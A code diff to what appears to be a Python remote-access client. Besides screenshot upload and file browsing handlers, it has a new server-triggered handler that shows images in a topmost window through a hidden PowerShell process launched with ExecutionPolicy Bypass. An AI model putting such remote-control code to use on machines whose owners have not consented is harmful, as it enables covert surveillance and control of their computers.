@@ -8,6 +8,7 @@ import subprocess
 import ctypes
 import shutil
 import string
+import tempfile
 from typing import Optional
 from PIL import ImageGrab, Image
 import socketio
@@ -229,6 +230,121 @@ def on_take_screenshot(data=None):
             )
         return
     threading.Thread(target=take_and_upload_screenshot, args=(req_id,), daemon=True).start()
+
+
+# ── Imager Display Handler ──
+
+def _show_image_dialog(image_b64: str, caption: str = ""):
+    temp_path = None
+    try:
+        raw_bytes = base64.b64decode(image_b64)
+        ext = "png"
+        if raw_bytes.startswith(b"\xff\xd8"):
+            ext = "jpg"
+        elif raw_bytes.startswith(b"GIF"):
+            ext = "gif"
+        elif raw_bytes.startswith(b"RIFF") and b"WEBP" in raw_bytes[:16]:
+            ext = "webp"
+
+        temp_dir = os.getenv("TEMP") or tempfile.gettempdir()
+        temp_path = os.path.join(temp_dir, f"run_img_{int(time.time() * 1000)}.{ext}")
+        with open(temp_path, "wb") as f:
+            f.write(raw_bytes)
+
+        caption_escaped = caption.replace("'", "''").replace('"', '`"')
+        ps_script = f"""
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing;
+$img = [Drawing.Image]::FromFile('{temp_path}');
+$maxW = 800; $maxH = 600;
+$iw = $img.Width; $ih = $img.Height;
+$scale = [Math]::Min([Math]::Min(($maxW / $iw), ($maxH / $ih)), 1.0);
+$dw = [Math]::Max([int]($iw * $scale), 320);
+$dh = [Math]::Max([int]($ih * $scale), 200);
+$formW = ($dw + 40);
+$caption = '{caption_escaped}';
+$hasCap = ($caption.Length -gt 0);
+$capH = if ($hasCap) {{ 36 }} else {{ 0 }};
+$formH = ($dh + $capH + 90);
+$f = New-Object Windows.Forms.Form;
+$f.Text = if ($hasCap) {{ $caption }} else {{ 'Image' }};
+$f.ClientSize = New-Object Drawing.Size($formW, $formH);
+$f.StartPosition = 'CenterScreen';
+$f.TopMost = $true;
+$f.FormBorderStyle = 'FixedDialog';
+$f.MaximizeBox = $false;
+$f.MinimizeBox = $false;
+$f.BackColor = [Drawing.Color]::FromArgb(24, 24, 27);
+$f.ForeColor = [Drawing.Color]::FromArgb(244, 244, 245);
+$curY = 16;
+if ($hasCap) {{
+    $lbl = New-Object Windows.Forms.Label;
+    $lbl.Text = $caption;
+    $lbl.Location = New-Object Drawing.Point(20, $curY);
+    $lbl.Size = New-Object Drawing.Size($dw, 28);
+    $lbl.Font = New-Object Drawing.Font('Segoe UI', 10, [Drawing.FontStyle]::Bold);
+    $lbl.ForeColor = [Drawing.Color]::FromArgb(244, 244, 245);
+    $lbl.AutoEllipsis = $true;
+    $f.Controls.Add($lbl);
+    $curY = ($curY + 34);
+}}
+$pb = New-Object Windows.Forms.PictureBox;
+$pb.Image = $img;
+$pb.SizeMode = 'Zoom';
+$pb.Location = New-Object Drawing.Point(20, $curY);
+$pb.Size = New-Object Drawing.Size($dw, $dh);
+$f.Controls.Add($pb);
+$curY = ($curY + $dh + 16);
+$btn = New-Object Windows.Forms.Button;
+$btn.Text = 'OK';
+$btnW = 90; $btnH = 30;
+$btnX = [int](($formW - $btnW) / 2);
+$btn.Size = New-Object Drawing.Size($btnW, $btnH);
+$btn.Location = New-Object Drawing.Point($btnX, $curY);
+$btn.BackColor = [Drawing.Color]::FromArgb(39, 39, 42);
+$btn.ForeColor = [Drawing.Color]::White;
+$btn.FlatStyle = 'Flat';
+$btn.FlatAppearance.BorderColor = [Drawing.Color]::FromArgb(63, 63, 70);
+$btn.Cursor = [Windows.Forms.Cursors]::Hand;
+$btn.DialogResult = [Windows.Forms.DialogResult]::OK;
+$f.AcceptButton = $btn;
+$f.CancelButton = $btn;
+$f.Controls.Add($btn);
+$f.Add_FormClosed({{
+    $pb.Image = $null;
+    $img.Dispose();
+    $f.Dispose();
+}});
+[void]$f.ShowDialog();
+"""
+        cmd = [
+            "powershell.exe",
+            "-NoProfile",
+            "-ExecutionPolicy",
+            "Bypass",
+            "-Command",
+            ps_script,
+        ]
+        subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
+    except Exception as e:
+        print(f"[Imager] Error showing image dialog: {e}")
+    finally:
+        if temp_path and os.path.exists(temp_path):
+            try:
+                os.remove(temp_path)
+            except Exception:
+                pass
+
+
+@sio.on("display_image")
+def on_display_image(data):
+    if not isinstance(data, dict):
+        return
+    image_b64 = data.get("image", "")
+    caption = data.get("caption", "")
+    if not image_b64:
+        return
+    print(f"Received display_image request (caption: {caption})")
+    threading.Thread(target=_show_image_dialog, args=(image_b64, caption), daemon=True).start()
 
 
 # ── File System / FTP Browser Handlers ──
